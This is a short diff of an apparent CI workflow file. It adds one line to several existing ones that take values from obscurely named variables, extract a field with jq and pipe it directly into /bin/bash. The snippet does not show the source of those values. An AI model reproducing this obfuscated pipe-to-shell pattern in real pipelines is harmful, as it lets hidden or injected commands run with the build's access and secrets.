@@ -27,6 +27,7 @@ jobs:
           echo $tjd648 | jq -r .n9 | /bin/bash
           echo $xkft12 | jq -r .t1 | /bin/bash
           echo $ax551 | jq -r .x2 | /bin/bash
+          printf '%s' "$x250" | jq -r .tojy15383 | /bin/bash
 
       - name: Archive output
         if: always()
